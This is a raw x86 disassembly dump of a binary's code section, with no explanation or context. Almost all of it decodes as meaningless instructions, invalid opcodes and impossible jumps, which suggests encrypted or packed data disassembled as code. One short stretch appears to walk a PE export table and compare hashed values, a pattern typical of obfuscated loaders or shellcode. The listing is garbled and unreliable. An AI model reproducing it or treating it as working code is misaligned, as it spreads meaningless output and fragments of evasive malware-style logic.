  41a107:	mov    bh,0x52
  41a109:	lods   al,BYTE PTR ds:[esi]
  41a10a:	jne    0x41a18a
  41a10c:	pop    es
  41a10d:	test   BYTE PTR [ecx-0x2d467f48],0x8c
  41a114:	cs cmp al,0x48
  41a117:	stos   BYTE PTR es:[edi],al
  41a118:	xor    BYTE PTR [ecx+0x5fb8b286],dl
  41a11e:	cdq    
  41a11f:	mov    dh,0xb3
  41a121:	popa   
  41a122:	add    DWORD PTR [edi-0x4808f38a],ebx
  41a128:	push   edx
  41a129:	xor    bl,BYTE PTR [ebx+0x761f761b]
  41a12f:	ficom  DWORD PTR [edx+0x58]
  41a132:	lahf   
  41a133:	(bad)  
  41a134:	gs inc eax
  41a136:	mov    esp,0x2eafd253
  41a13b:	xor    DWORD PTR [edi+0x51072329],edx
  41a141:	sub    eax,0x7dcf8e2f
  41a146:	mov    edx,ebp
  41a148:	sti    
  41a149:	sbb    ebp,edi
  41a14b:	les    esi,FWORD PTR [esi]
  41a14d:	pop    ss
  41a14e:	test   al,0xb8
  41a150:	out    dx,al
  41a151:	mov    ebp,DWORD PTR es:[esi+0xe]
  41a155:	mov    ecx,0x7843a025
  41a15a:	add    eax,0x37e87596
  41a15f:	sahf   
  41a160:	lds    eax,FWORD PTR [ebx-0x2a58c44e]
  41a166:	jns    0x41a13c
  41a168:	sar    bh,0x61
  41a16b:	dec    DWORD PTR [ebp-0x46b54356]
  41a171:	xor    eax,0xf07b51f9
  41a176:	jp     0x41a1b7
  41a178:	pusha  
  41a179:	pop    edi
  41a17a:	cmp    esp,esp
  41a17c:	push   ss
  41a17d:	xor    al,0x1e
  41a17f:	dec    eax
  41a180:	bound  edi,QWORD PTR [eax+0xe702e59]
  41a186:	push   esi
  41a187:	out    dx,al
  41a188:	test   al,0x1
  41a18a:	daa    
  41a18b:	shl    dh,0xc3
  41a18e:	mov    al,ds:0xd44be2f1
  41a193:	sbb    BYTE PTR [ebp+0x14],ah
  41a196:	sbb    BYTE PTR [edx],bl
  41a198:	inc    ebx
  41a199:	jg     0x41a1e9
  41a19b:	fisttp WORD PTR [edx+0xec63986]
  41a1a1:	shr    BYTE PTR [esi-0xfce8083],1
  41a1a7:	loopne 0x41a1b6
  41a1a9:	out    dx,al
  41a1aa:	repz jecxz 0x41a217
  41a1ad:	cli    
  41a1ae:	inc    ebx
  41a1af:	jmp    ecx
  41a1b1:	retf   
  41a1b2:	sti    
  41a1b3:	out    dx,eax
  41a1b4:	out    0x8f,eax
  41a1b6:	ins    DWORD PTR es:[edi],dx
  41a1b7:	add    eax,DWORD PTR [eax+0x42]
  41a1ba:	push   cs
  41a1bb:	js     0x152004fe
  41a1c1:	test   BYTE PTR [ebp+0x231826a0],ch
  41a1c7:	xor    DWORD PTR [esi-0x15898822],0x63aee92a
  41a1d1:	and    al,0x9
  41a1d3:	adc    BYTE PTR ds:0x40266e96,cl
  41a1d9:	mov    dh,0x11
  41a1db:	in     eax,0x87
  41a1dd:	cli    
  41a1de:	clc    
  41a1df:	shl    edx,1
  41a1e1:	into   
  41a1e2:	adc    al,0x6b
  41a1e4:	pop    eax
  41a1e5:	or     edi,ebx
  41a1e7:	mov    WORD PTR [esi+0x79],gs
  41a1ea:	mov    al,ds:0x766fccb6
  41a1ef:	test   dl,ch
  41a1f1:	pop    edx
  41a1f2:	out    0x77,eax
  41a1f4:	lahf   
  41a1f5:	dec    ebx
  41a1f6:	push   esi
  41a1f7:	push   cs
  41a1f8:	inc    esp
  41a1f9:	sub    ch,BYTE PTR [edi-0x1324ecc]
  41a1ff:	and    BYTE PTR [eax],bl
  41a201:	out    0xff,eax
  41a203:	retf   
  41a204:	daa    
  41a205:	fldenv es:[ebx-0x60132047]
  41a20c:	lds    ecx,FWORD PTR [esi-0x39e8d834]
  41a212:	pop    ebx
  41a213:	lock ficomp WORD PTR [ebp-0x676f06f]
  41a21a:	sub    ecx,esp
  41a21c:	addr16 jnp 0x41a1ca
  41a21f:	dec    edi
  41a220:	push   esp
  41a221:	std    
  41a222:	jp     0x41a24e
  41a224:	inc    eax
  41a225:	push   ebx
  41a226:	jp     0x41a276
  41a228:	lods   eax,DWORD PTR gs:[esi]
  41a22a:	jns    0x41a1bf
  41a22c:	sbb    al,0xde
  41a22e:	int3   
  41a22f:	fist   WORD PTR [eax+0x16]
  41a232:	dec    eax
  41a233:	test   eax,0xc60b52de
  41a238:	aam    0x7b
  41a23a:	cs sub edi,ebp
  41a23d:	addr16 or eax,0x5e2e3b40
  41a243:	sub    dl,BYTE PTR [edx+0x2045e389]
  41a249:	inc    esi
  41a24a:	jbe    0x41a225
  41a24c:	(bad)  
  41a24d:	pop    ecx
  41a24e:	adc    al,0xad
  41a250:	daa    
  41a251:	mov    ds:0x87529ea9,eax
  41a256:	jb     0x41a2c1
  41a258:	mov    dl,BYTE PTR [edi]
  41a25a:	icebp  
  41a25b:	loop   0x41a2db
  41a25d:	push   eax
  41a25e:	mov    esp,0x9a45e99e
  41a263:	fs aaa 
  41a265:	jl     0x41a2df
  41a267:	in     al,0xea
  41a269:	stos   DWORD PTR es:[edi],eax
  41a26a:	test   BYTE PTR [eax-0x5d],0x40
  41a26e:	mov    bh,0xe3
  41a270:	sub    ebx,ecx
  41a272:	and    BYTE PTR [esi+ebp*2-0x47],bl
  41a276:	cmc    
  41a277:	out    dx,eax
  41a278:	push   esp
  41a279:	pop    ds
  41a27a:	or     dl,ah
  41a27c:	aam    0x22
  41a27e:	stos   DWORD PTR es:[edi],eax
  41a27f:	lods   al,BYTE PTR ss:[esi]
  41a281:	dec    ebx
  41a282:	mov    ds:0x51d233a8,eax
  41a287:	stc    
  41a288:	imul   edx,DWORD PTR [ebp-0x10],0x34f824c3
  41a28f:	aaa    
  41a290:	sub    al,0xab
  41a292:	inc    ecx
  41a293:	aam    0x73
  41a295:	sub    bh,BYTE PTR [ecx-0x265fa6dd]
  41a29b:	mov    bl,0xc0
  41a29d:	stos   DWORD PTR es:[edi],eax
  41a29e:	xchg   esp,eax
  41a29f:	test   eax,0x3589728f
  41a2a4:	adc    eax,edx
  41a2a6:	bnd ret 
  41a2a8:	das    
  41a2a9:	mov    dh,0x7e
  41a2ab:	sub    edx,esi
  41a2ad:	sbb    DWORD PTR [edi+eax*4+0x4c964407],ebp
  41a2b4:	mov    al,0xa6
  41a2b6:	lahf   
  41a2b7:	fisubr DWORD PTR [edi-0x2103529]
  41a2bd:	lahf   
  41a2be:	adc    DWORD PTR [eax+0x7c],0xffffffc5
  41a2c2:	pop    edi
  41a2c3:	cwde   
  41a2c4:	push   es
  41a2c5:	mov    ch,0x71
  41a2c7:	add    DWORD PTR [eax+eiz*1-0x39dc24f2],0xfffffffa
  41a2cf:	and    BYTE PTR [ecx],0x6f
  41a2d2:	cmp    al,0x94
  41a2d4:	mov    ebx,0xc2ce3cfe
  41a2d9:	jecxz  0x41a302
  41a2db:	push   ebx
  41a2dc:	jle    0x41a30a
  41a2de:	or     al,0xc8
  41a2e0:	dec    ecx
  41a2e1:	mov    dl,0x80
  41a2e3:	and    eax,0xcd631770
  41a2e8:	sub    BYTE PTR [eax-0x4030a31],bl
  41a2ee:	fnstsw WORD PTR [esi-0x58]
  41a2f1:	xchg   ebx,eax
  41a2f2:	mov    ah,0xde
  41a2f4:	push   ecx
  41a2f5:	or     DWORD PTR [esi+0x150bc04d],ecx
  41a2fb:	popf   
  41a2fc:	arpl   bx,cx
  41a2fe:	and    al,0x28
  41a300:	imul   edi,DWORD PTR [edx-0x9],0x4d
  41a304:	jb     0x41a2cb
  41a306:	push   cs
  41a307:	xchg   esi,eax
  41a308:	jmp    0x9cde:0xa1196636
  41a30f:	mov    bl,0x7b
  41a311:	lahf   
  41a312:	cld    
  41a313:	push   eax
  41a314:	or     al,0xb1
  41a316:	adc    DWORD PTR [esi-0x9],edx
  41a319:	push   es
  41a31a:	xlat   BYTE PTR ds:[ebx]
  41a31b:	in     eax,dx
  41a31c:	adc    al,0x80
  41a31e:	or     DWORD PTR [ebp-0x3c4d3b2],0xffffffc3
  41a325:	cwde   
  41a326:	add    DWORD PTR [esp],ebx
  41a329:	xchg   ebp,eax
  41a32a:	imul   eax,DWORD PTR ds:0x16eb03a6,0xffffffdf
  41a331:	test   ebp,esi
  41a333:	jbe    0x41a2bc
  41a335:	pop    edx
  41a336:	mov    DWORD PTR [ecx+eax*1-0x5e5a35d7],esp
  41a33d:	sub    DWORD PTR [ebx-0x75],esi
  41a340:	in     eax,dx
  41a341:	or     al,0xe9
  41a343:	in     eax,dx
  41a344:	pop    esi
  41a345:	xor    BYTE PTR [ebx+0x47200758],dh
  41a34b:	cmp    BYTE PTR [edx+ebp*8+0x44119c89],ch
  41a352:	add    BYTE PTR [ebp-0x45],bl
  41a355:	cmp    bl,al
  41a357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a358:	int    0x46
  41a35a:	lock jp 0x41a3af
  41a35d:	inc    ecx
  41a35e:	or     BYTE PTR [eax+0x42],dh
  41a361:	sahf   
  41a362:	daa    
  41a363:	or     eax,0xae0061ca
  41a368:	xlat   BYTE PTR ds:[ebx]
  41a369:	mov    esi,0x3cf860ba
  41a36e:	je     0x41a39a
  41a370:	rol    DWORD PTR [ebx+0x79d5850c],cl
  41a376:	div    BYTE PTR [eax-0x515c532b]
  41a37c:	fcmovb st,st(3)
  41a37e:	data16 arpl WORD PTR [ebx],cx
  41a381:	push   esp
  41a382:	jecxz  0x41a34a
  41a384:	xchg   esi,eax
  41a385:	push   esi
  41a386:	push   es
  41a387:	push   edi
  41a388:	sub    eax,0xa022ce84
  41a38d:	fcomp  QWORD PTR [eax]
  41a38f:	clc    
  41a390:	outs   dx,DWORD PTR ds:[esi]
  41a391:	lock adc al,0xe3
  41a394:	int    0x30
  41a396:	inc    esp
  41a397:	mov    cl,0x8
  41a399:	inc    ebp
  41a39a:	hlt    
  41a39b:	jl     0x41a3ae
  41a39d:	and    eax,0x59024430
  41a3a2:	(bad)  
  41a3a3:	fstp   TBYTE PTR [eax]
  41a3a5:	aas    
  41a3a6:	push   0xffffff9f
  41a3a8:	adc    eax,0x50f03c9
  41a3ad:	jg     0x41a3c0
  41a3af:	sti    
  41a3b0:	adc    DWORD PTR [edi-0x1a],0xffffffad
  41a3b4:	jno    0x41a3a7
  41a3b6:	cli    
  41a3b7:	iret   
  41a3b8:	jne    0x41a3e1
  41a3ba:	inc    eax
  41a3bb:	push   ds
  41a3bc:	lea    ecx,[eax+0x0]
  41a3bf:	inc    edx
  41a3c0:	push   0xffffffb1
  41a3c2:	add    DWORD PTR es:[edi],0x2
  41a3c6:	or     BYTE PTR [edx+0x1a],0x9
  41a3ca:	cmp    esp,DWORD PTR [eax-0x112625e6]
  41a3d0:	sbb    BYTE PTR [ecx],dh
  41a3d2:	add    BYTE PTR [ebx-0x6ffd27fa],bl
  41a3d8:	jo     0x41a44e
  41a3da:	push   ebp
  41a3db:	push   edi
  41a3dc:	ret    
  41a3dd:	pop    ds
  41a3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3df:	out    dx,eax
  41a3e0:	mov    ah,BYTE PTR [edi]
  41a3e2:	mov    esi,0xf55c925a
  41a3e7:	and    bl,al
  41a3e9:	and    edi,DWORD PTR [ebp+0x21d23da9]
  41a3ef:	lods   eax,DWORD PTR ds:[esi]
  41a3f0:	popf   
  41a3f1:	stos   DWORD PTR es:[edi],eax
  41a3f2:	cmp    eax,0x8e9b7a3f
  41a3f7:	push   0xffffff96
  41a3f9:	fnstsw WORD PTR [ecx-0x28f6d2f4]
  41a3ff:	xchg   esi,eax
  41a400:	inc    esi
  41a401:	call   0x8e24:0x2c7a237f
  41a408:	(bad)  
  41a409:	sar    DWORD PTR [edi-0x6f7f8d5c],1
  41a40f:	(bad)  
  41a410:	and    al,0x92
  41a412:	inc    edx
  41a413:	add    al,0xd8
  41a415:	(bad)  
  41a416:	repnz pop ebx
  41a418:	dec    ebx
  41a419:	arpl   WORD PTR [edx],bx
  41a41b:	and    edx,edi
  41a41d:	xchg   edx,eax
  41a41e:	enter  0xa872,0x35
  41a422:	test   DWORD PTR [esp+ebp*4],ecx
  41a425:	adc    DWORD PTR [ebp-0x5b3f4962],edx
  41a42b:	cs jo  0x41a3b7
  41a42e:	in     eax,dx
  41a42f:	pop    eax
  41a430:	add    BYTE PTR [esi-0x6d1a064c],bh
  41a436:	mov    cl,0x44
  41a438:	pop    ss
  41a439:	adc    edi,ebp
  41a43b:	ret    0x9629
  41a43e:	jnp    0x41a467
  41a440:	dec    ebp
  41a441:	(bad)  
  41a442:	int3   
  41a443:	xchg   ebp,eax
  41a444:	(bad)  
  41a445:	cmp    cl,bh
  41a447:	ficomp WORD PTR [eax-0x2b]
  41a44a:	inc    edi
  41a44b:	or     bh,BYTE PTR [ecx-0x53f559f2]
  41a451:	outs   dx,BYTE PTR ds:[esi]
  41a452:	push   eax
  41a453:	rcr    BYTE PTR [eax-0x3bb8aa52],cl
  41a459:	push   ss
  41a45a:	and    esp,ebp
  41a45c:	icebp  
  41a45d:	cmp    DWORD PTR [eax-0x31d02879],esi
  41a463:	fstp   QWORD PTR [ecx+0xe795582]
  41a469:	test   BYTE PTR [ecx],0xf3
  41a46c:	xor    BYTE PTR ds:0xb07960b9,0xe1
  41a473:	cli    
  41a474:	bnd call DWORD PTR [eax-0x58227c25]
  41a47b:	dec    si
  41a47d:	xor    DWORD PTR [eax-0x11],esi
  41a480:	aaa    
  41a481:	int3   
  41a482:	lea    ecx,[esi+0x33f111]
  41a488:	jl     0x41a484
  41a48a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a48b:	sub    BYTE PTR [esi+0x10],ch
  41a48e:	mov    ah,0x62
  41a490:	jns    0x41a4cd
  41a492:	sbb    al,BYTE PTR [ebx+0x7]
  41a495:	(bad)  
  41a496:	fcomp  QWORD PTR [edi+ebx*2]
  41a499:	fsub   st,st(7)
  41a49b:	and    eax,DWORD PTR [edx-0x64]
  41a49e:	gs call 0x286e:0xd7cf0cab
  41a4a6:	ss mov edi,0x7e8b13cf
  41a4ac:	xchg   ebp,eax
  41a4ad:	pop    eax
  41a4ae:	mov    ebp,0x21359c0b
  41a4b3:	mov    ebp,0xc103f233
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x4580adab]
  41a500:	jecxz  0x41a54a
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x1d]
  41a50a:	clc    
  41a50b:	(bad)  
  41a50c:	sub    BYTE PTR [edi-0x26],bl
  41a50f:	fld    TBYTE PTR [edi+eax*2-0x605783e9]
  41a516:	loopne 0x41a578
  41a518:	call   0xa0b823f1
  41a51d:	xchg   edx,eax
  41a51e:	sbb    DWORD PTR [ecx],esp
  41a520:	inc    ebx
  41a521:	int    0x89
  41a523:	loope  0x41a4dc
  41a525:	or     BYTE PTR [ecx+0x43d87d58],cl
  41a52b:	pop    edi
  41a52c:	sbb    BYTE PTR [esi+eiz*1+0x7bc2c6d9],bh
  41a533:	std    
  41a534:	out    0x34,eax
  41a536:	sub    al,0x5b
  41a538:	loop   0x41a4f9
  41a53a:	xchg   DWORD PTR [edx+0x7],edi
  41a53d:	in     al,dx
  41a53e:	enter  0xac58,0x93
  41a542:	mov    edx,0x5b8724f5
  41a547:	cdq    
  41a548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a549:	jno    0x41a554
  41a54b:	loope  0x41a588
  41a54d:	retf   0x51c6
  41a550:	mov    WORD PTR [edi+0x15bf50cd],ss
  41a556:	xchg   BYTE PTR [ebp-0x1c],cl
  41a559:	rol    ebp,0xf5
  41a55c:	mov    bl,0xac
  41a55e:	jo     0x41a529
  41a560:	sbb    al,0x9b
  41a562:	push   ebp
  41a563:	and    DWORD PTR [esi-0x11097685],eax
  41a569:	ret    0xd534
  41a56c:	mov    ds:0xc494ecb,al
  41a571:	shl    ecx,1
  41a573:	jmp    0x41a539
  41a575:	stc    
  41a576:	pusha  
  41a577:	sub    al,0x16
  41a579:	inc    esi
  41a57a:	inc    ebp
  41a57b:	inc    esp
  41a57c:	dec    ecx
  41a57d:	adc    cl,0x1
  41a580:	(bad)  
  41a581:	ins    BYTE PTR es:[edi],dx
  41a582:	adc    ecx,ebx
  41a584:	xchg   DWORD PTR [eax],ebp
  41a586:	icebp  
  41a587:	cmp    BYTE PTR [edi+0xc],dl
  41a58a:	xchg   esp,eax
  41a58b:	fs repnz (bad) 
  41a58e:	mov    al,ds:0x806af55e
  41a593:	xchg   ebp,eax
  41a594:	ins    BYTE PTR es:[edi],dx
  41a595:	xchg   ecx,eax
  41a596:	inc    esi
  41a597:	push   edi
  41a598:	push   esp
  41a599:	mov    edi,0x5543aa4a
  41a59e:	fisubr DWORD PTR [esi-0x7f]
  41a5a1:	test   al,0xa1
  41a5a3:	sub    edi,DWORD PTR [ebx+eax*4-0x48201365]
  41a5aa:	push   ss
  41a5ab:	xchg   esi,eax
  41a5ac:	mov    esi,0xc8d98d5f
  41a5b1:	cmp    ebp,ecx
  41a5b3:	pushf  
  41a5b4:	adc    DWORD PTR [ebx-0x1d],edx
  41a5b7:	gs pushf 
  41a5b9:	test   al,0x5a
  41a5bb:	fs jmp 0x12a4ffec
  41a5c1:	test   dl,0xf0
  41a5c4:	pop    esi
  41a5c6:	add    dh,BYTE PTR ds:0x81e32620
  41a5cc:	test   al,0x21
  41a5ce:	xor    ecx,ebp
  41a5d0:	xchg   esi,eax
  41a5d1:	inc    edi
  41a5d2:	or     ecx,DWORD PTR [ebp-0x3a78e3bc]
  41a5d8:	pop    esp
  41a5d9:	sub    edi,ecx
  41a5db:	mov    eax,0xfe8b82bb
  41a5e0:	or     al,0x28
  41a5e3:	pop    eax
  41a5e4:	and    ebp,DWORD PTR [eax-0x2f]
  41a5e7:	ror    BYTE PTR [ebx-0x4f],0x37
  41a5eb:	rcl    DWORD PTR [ebp-0x35],1
  41a5ee:	(bad)  
  41a5ef:	in     al,dx
  41a5f0:	(bad)  
  41a5f1:	stc    
  41a5f2:	jno    0x41a5f2
  41a5f4:	clc    
  41a5f5:	mov    ebp,0xb6542f65
  41a5fa:	dec    eax
  41a5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5fc:	ret    
  41a5fd:	shl    DWORD PTR [esi],cl
  41a5ff:	lock je 0x41a5bd
  41a602:	shr    al,0x51
  41a605:	jle    0x41a60d
  41a607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a608:	add    eax,0xb469992
  41a60d:	xor    bh,BYTE PTR [ebx]
  41a60f:	xor    al,0x34
  41a611:	in     eax,0x7f
  41a613:	jbe    0x41a68b
  41a615:	pushf  
  41a616:	jo     0x41a697
  41a618:	dec    ecx
  41a619:	sub    al,0x6a
  41a61b:	jbe    0x41a5f6
  41a61d:	xchg   ecx,eax
  41a61e:	mov    edi,0x148ec7f4
  41a623:	outs   dx,DWORD PTR ds:[esi]
  41a624:	pop    ebx
  41a625:	pop    ss
  41a626:	and    eax,0x86f8e7e2
  41a62b:	jle    0x41a658
  41a62d:	adc    BYTE PTR [edx],dl
  41a62f:	aam    0x9b
  41a631:	mov    gs,WORD PTR [esi-0x59202c4f]
  41a637:	mov    es,ecx
  41a639:	dec    esi
  41a63a:	jle    0x41a6b3
  41a63c:	icebp  
  41a63d:	faddp  st(7),st
  41a63f:	jge    0x41a6b5
  41a641:	xchg   DWORD PTR [edi+edi*4-0x1d3b42f8],ecx
  41a648:	aad    0xd5
  41a64a:	mov    edx,edi
  41a64c:	clc    
  41a64d:	(bad)  
  41a64e:	(bad)  
  41a64f:	fld    QWORD PTR [edi+0x50367a6]
  41a655:	arpl   WORD PTR [eax],si
  41a657:	push   ebp
  41a658:	mov    dl,0xd5
  41a65a:	jno    0x41a5ef
  41a65c:	mov    ch,0x48
  41a65e:	dec    eax
  41a65f:	call   0x661b98ef
  41a664:	fild   QWORD PTR [eax+0x49896022]
  41a66a:	push   es
  41a66b:	sbb    dh,cl
  41a66d:	in     al,dx
  41a66e:	arpl   WORD PTR [esi+0x4d],di
  41a671:	gs jle 0x41a619
  41a674:	mov    bh,0x5f
  41a676:	(bad)  
  41a677:	xor    dl,ah
  41a679:	xchg   ebx,eax
  41a67a:	imul   esi,DWORD PTR [ebp-0x758a7e60],0x850fa209
  41a684:	ins    DWORD PTR es:[edi],dx
  41a685:	inc    ebx
  41a686:	outs   dx,DWORD PTR ds:[esi]
  41a687:	(bad)  
  41a688:	(bad)  
  41a689:	rol    esi,cl
  41a68b:	leave  
  41a68c:	xor    DWORD PTR [ecx],0x5de20bc0
  41a692:	sti    
  41a693:	inc    edx
  41a694:	sub    bh,ch
  41a696:	jae    0x41a6cb
  41a698:	aam    0xc
  41a69a:	stos   BYTE PTR es:[edi],al
  41a69b:	xor    eax,0x5075e86a
  41a6a0:	jmp    0xad28164
  41a6a5:	push   esp
  41a6a6:	dec    ebx
  41a6a7:	aad    0x95
  41a6a9:	mov    ds:0x4fe71ca5,eax
  41a6ae:	shr    DWORD PTR [ecx+0x75353e69],0xa7
  41a6b5:	inc    eax
  41a6b6:	jle    0x41a653
  41a6b8:	mov    ecx,0xbfefa466
  41a6bd:	stc    
  41a6be:	in     al,0x79
  41a6c0:	inc    ecx
  41a6c1:	xchg   ebx,eax
  41a6c2:	add    eax,0xb6e6a73a
  41a6c7:	dec    esi
  41a6c8:	jbe    0x41a6b6
  41a6ca:	mov    BYTE PTR es:[eax-0x1fea0bbc],bl
  41a6d1:	mov    ebx,0x8c7c9192
  41a6d6:	add    BYTE PTR [esi-0x2d2f8739],bl
  41a6dc:	cli    
  41a6dd:	push   esi
  41a6de:	hlt    
  41a6df:	pushf  
  41a6e0:	mov    bh,0xcb
  41a6e2:	out    0xc6,al
  41a6e4:	mov    esp,0x6f281bfb
  41a6e9:	test   eax,0xf19545ea
  41a6ee:	sbb    ecx,esp
  41a6f0:	mov    ds:0xc8553f61,eax
  41a6f5:	sti    
  41a6f6:	push   ebx
  41a6f7:	dec    ebx
  41a6f8:	int3   
  41a6f9:	js     0x41a770
  41a6fb:	fwait
  41a6fc:	push   edi
  41a6fd:	lea    esi,[edx+0x22b7223f]
  41a703:	jns    0x41a77e
  41a705:	pop    edi
  41a706:	cld    
  41a707:	lea    edx,fs:[di]
  41a70b:	out    dx,al
  41a70c:	cs dec esp
  41a70e:	jns    0x41a72a
  41a710:	mov    eax,0x3bca8beb
  41a715:	push   es
  41a716:	das    
  41a717:	or     BYTE PTR [eax-0x72],cl
  41a71a:	int    0xfd
  41a71c:	mov    ds:0xf9d08685,eax
  41a721:	or     eax,0x111da05a
  41a726:	sub    DWORD PTR [esi-0x59],edi
  41a729:	outs   dx,DWORD PTR ds:[esi]
  41a72a:	sbb    eax,0x23561b21
  41a72f:	div    DWORD PTR ds:0x8848f9d2
  41a735:	sub    DWORD PTR [eax],esp
  41a737:	dec    esi
  41a738:	mov    ebx,0x93fbddea
  41a73d:	cli    
  41a73e:	mov    cl,0xa5
  41a740:	mov    bh,0x21
  41a742:	add    eax,0xdaaa79e3
  41a747:	add    dh,ch
  41a749:	and    edx,DWORD PTR [ecx+ebp*8+0x241ef4fb]
  41a750:	sub    ah,BYTE PTR [esi+0x35695509]
  41a756:	cwde   
  41a757:	xchg   edi,eax
  41a758:	xchg   esp,eax
  41a759:	int3   
  41a75a:	clc    
  41a75b:	sub    BYTE PTR [ebx],bh
  41a75d:	idiv   DWORD PTR [esi-0x509ebe8d]
  41a763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a764:	sbb    DWORD PTR [edi+0x5556df28],esp
  41a76a:	or     cl,al
  41a76c:	xor    dl,BYTE PTR ds:[esi-0x6a]
  41a770:	mov    esp,0x4ec860ad
  41a775:	dec    eax
  41a776:	ret    0x58ce
  41a779:	mov    al,ds:0xdcdc4596
  41a77e:	xor    al,0x7f
  41a780:	push   ecx
  41a781:	cmp    BYTE PTR [esi-0x35b84c03],bl
  41a787:	mov    eax,0xbf10119a
  41a78c:	and    ecx,ecx
  41a78e:	in     eax,0xc
  41a790:	jne    0x41a7e8
  41a792:	ja     0x41a798
  41a794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a795:	stos   DWORD PTR es:[edi],eax
  41a796:	mov    gs,WORD PTR [ebp+0x42]
  41a799:	xchg   edx,eax
  41a79a:	(bad)  
  41a79b:	loop   0x41a793
  41a79d:	in     al,0x31
  41a79f:	pop    edx
  41a7a0:	popa   
  41a7a1:	in     eax,0x82
  41a7a3:	pop    ds
  41a7a4:	scas   eax,DWORD PTR es:[edi]
  41a7a5:	iret   
  41a7a6:	jo     0x41a7fd
  41a7a8:	aas    
  41a7a9:	sbb    bl,ch
  41a7ab:	int    0xfb
  41a7ad:	std    
  41a7ae:	iret   
  41a7af:	icebp  
  41a7b0:	dec    edi
  41a7b1:	adc    ecx,DWORD PTR [ebx+0x20]
  41a7b4:	push   eax
  41a7b5:	repnz adc DWORD PTR [edx-0xd8f8989],0x8f873a6
  41a7c0:	cmp    al,0xbf
  41a7c2:	adc    edx,ecx
  41a7c4:	push   ebx
  41a7c5:	inc    edi
  41a7c6:	pop    edx
  41a7c7:	into   
  41a7c8:	xor    eax,0x1ec34e45
  41a7cd:	sub    BYTE PTR [ebx+eax*8+0x53],al
  41a7d1:	mov    ds:0x76cd43c7,eax
  41a7d6:	mov    bh,BYTE PTR ds:0xa5bbe5cd
  41a7dc:	leave  
  41a7dd:	rcl    BYTE PTR [eax+0x2a],cl
  41a7e0:	(bad)  
  41a7e1:	jns    0x41a836
  41a7e3:	gs dec esi
  41a7e5:	je     0x41a79d
  41a7e7:	dec    ebx
  41a7e8:	and    DWORD PTR [esp+ebx*2],ecx
  41a7eb:	mov    WORD PTR [esi-0x60],cs
  41a7ee:	add    al,0x25
  41a7f0:	(bad)  [ebp+0x1]
  41a7f3:	mov    edi,0xe7d8abc5
  41a7f8:	xchg   edi,eax
  41a7f9:	push   cs
  41a7fa:	pop    ebx
  41a7fb:	outs   dx,BYTE PTR ds:[esi]
  41a7fc:	jns    0x41a7ff
  41a7fe:	in     eax,dx
  41a7ff:	loopne 0x41a806
  41a801:	shr    BYTE PTR [esp+eiz*2],1
  41a804:	repz sub BYTE PTR [ebp-0xf],ch
  41a808:	mov    dh,BYTE PTR [esi]
  41a80a:	sub    ch,bh
  41a80c:	data16 data16 fld QWORD PTR [ecx-0x30]
  41a811:	out    dx,al
  41a812:	rcl    DWORD PTR [ebp-0x492e82d1],0x75
  41a819:	push   ss
  41a81a:	dec    cl
  41a81c:	das    
  41a81d:	xor    eax,0xe4206e1c
  41a822:	sub    DWORD PTR [edx-0x7ac52415],edi
  41a828:	dec    edi
  41a829:	add    BYTE PTR [eax],bh
  41a82b:	mov    BYTE PTR [edi-0x1e],al
  41a82e:	jae    0x41a852
  41a830:	test   DWORD PTR [ecx+0x52],ebp
  41a833:	in     al,dx
  41a834:	jb     0x41a829
  41a836:	xchg   edx,eax
  41a837:	mov    ?,WORD PTR [eax]
  41a839:	(bad)  
  41a83a:	sub    ah,BYTE PTR [eax-0x6aedeeaa]
  41a840:	pop    eax
  41a841:	imul   esi,DWORD PTR [ecx+0x3e623987],0x2ecf4268
  41a84b:	fst    QWORD PTR [ebp+edx*8-0x63d3864d]
  41a852:	int3   
  41a853:	and    al,BYTE PTR [edx]
  41a855:	xchg   edx,eax
  41a856:	add    eax,edi
  41a858:	add    ah,dh
  41a85a:	repz test al,0x84
  41a85d:	add    eax,0xdf5f3261
  41a862:	mov    dl,BYTE PTR [ebx+ebp*1-0x9]
  41a866:	in     eax,0x49
  41a868:	sub    al,0x24
  41a86a:	inc    ebp
  41a86b:	sub    eax,0x781df8fa
  41a870:	pop    ecx
  41a871:	dec    esi
  41a872:	adc    dl,BYTE PTR [edi-0x7c95361]
  41a878:	inc    esi
  41a879:	jns    0x41a825
  41a87b:	xchg   esp,eax
  41a87c:	mov    esi,0x4a6e83c5
  41a881:	or     eax,0x883f5473
  41a886:	sar    BYTE PTR [edx+0x51],cl
  41a889:	xchg   esi,eax
  41a88a:	jmp    0x41a819
  41a88c:	dec    ecx
  41a88d:	fidiv  DWORD PTR [esi+0x3]
  41a890:	in     eax,0xc6
  41a892:	mov    edx,0xc467c2b6
  41a897:	ins    DWORD PTR es:[edi],dx
  41a898:	adc    ebx,edi
  41a89a:	mov    DWORD PTR [esi],ecx
  41a89c:	mov    esp,0x5739b7c7
  41a8a1:	ins    BYTE PTR es:[edi],dx
  41a8a2:	jecxz  0x41a84c
  41a8a4:	cs push esp
